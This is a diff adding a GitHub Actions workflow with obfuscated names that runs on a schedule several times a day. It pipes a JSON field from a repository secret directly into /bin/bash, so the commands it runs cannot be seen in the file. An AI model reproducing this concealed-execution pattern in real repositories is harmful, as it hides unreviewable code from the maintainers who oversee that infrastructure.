@@ -1,0 +1,20 @@
+name: jiashiliukelian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiashiliukelian
+        env:
+          rqz295: ${{ secrets.rqz295 }}
+        run: |
+          echo $rqz295 | jq -r .imxzp917 | /bin/bash
+          echo $myny9732 | jq -r .o20096 | /bin/bash
+          echo $sx2 | jq -r .skln52777 | /bin/bash
+          echo $triiq90 | jq -r .w16682 | /bin/bash
+          echo $ste7454 | jq -r .fa87655 | /bin/bash
+
